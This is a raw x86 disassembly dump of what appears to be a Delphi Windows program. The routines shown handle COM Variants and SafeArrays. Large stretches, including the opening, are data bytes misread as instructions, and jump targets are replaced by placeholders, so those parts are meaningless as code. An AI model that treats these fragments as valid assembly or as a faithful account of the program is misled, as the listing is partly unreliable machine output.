add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
inc ecx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
rcl [ edx + ecx ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] dl
cld
outsd
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + 0xb ] cl
inc ecx
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
inc eax
add ah bh
insd
inc eax
add al al
inc ecx
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add ah bh
inc eax
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ edi + edi + 0x40 ] dl
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
inc ecx
inc eax
add ah bh
inc eax
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x69726156 ] dl
inc eax
add ah ah
or al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xa
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
or al [ ecx ]
or al 0x0
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
adc al 0xc
inc ecx
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + 0x410b ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00410b ] dh
add [ eax ] al
add ah ah
mov al [ eax ]
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ edx + ecx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x41 ] bh
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c7d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_410d0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412964
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412964
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d16
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404e68
retn
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xb ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
outsd
push 0x0
xor eax eax
push ebp
push sub_410c76
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x41
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_410c2c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_410c76
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c7d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_410c80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410d0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412964
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412964
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d16
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404e68
retn
sub_410d1c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_410d66
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d6d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_410d70
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410dff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412964
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412964
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e06
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404e68
retn
sub_410e0c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_410e56
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e5d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_410e60
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4110a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4110ac
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_404e68
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
dec eax
je r-xdata
call sub_410c2c
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
jmp r-xdata
call sub_410d1c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40d3a0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
jmp r-xdata
sub_4110c0
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_410c80
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_410d70
jmp r-xdata
jmp r-xdata
call sub_410e60
sub_4110f4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41113e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411145
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41115c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_41118c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_41118c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_4111e8
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
movzx eax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_4110b4
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_4110b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_41115c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_4110b4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_4110b4
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_41118c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_4110b4
mov eax [ ebp - 0x314 ]
call sub_4113e0
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_411364
push ebx
push esi
push ecx
mov ebx eax
movzx esi [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_4110b4
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404e44
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_412dc0
test al al
je r-xdata
mov eax ebx
call sub_4111e8
jmp r-xdata
push ebx
call VariantClear
push ebx
call VariantInit
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_4113fc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_41142c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_41142c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_411488
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_4110b4
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_4110b4
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_4113e0
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_410e0c
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_4110b4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_4110b4
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_4113fc
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_41142c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_4110b4
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_4110b4
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41165c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
movzx edi [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_411364
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_4110b4
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404e98
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_412dc0
test al al
je r-xdata
mov ecx sub_411654
mov edx esi
mov eax ebx
call sub_411488
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_4110b4
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_411708
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_41165c
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_411364
sub_41174c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40566c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_4110c0
pop ebx
pop ebp
retn 0x8
sub_411784
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40566c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_4110c0
pop ebx
pop ebp
retn 0x8
sub_4117bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411874
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40566c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_4110c0
movzx eax [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41187b
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4050e8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4090e4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4057bc
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4050e8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_409048
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4057bc
jmp r-xdata
jmp r-xdata
call sub_410d1c
sub_411884
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411943
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411921
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x100
call sub_4110c0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_405780
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405924
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4050e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411928
lea eax [ ebp - 0x10 ]
call sub_4113e0
retn
sub_411950
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4119a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_411708
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_411a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4119ad
lea eax [ ebp - 0x10 ]
call sub_4113e0
retn
sub_4119b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_412dc0
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411a29
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_4113e0
retn
sub_411a3c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
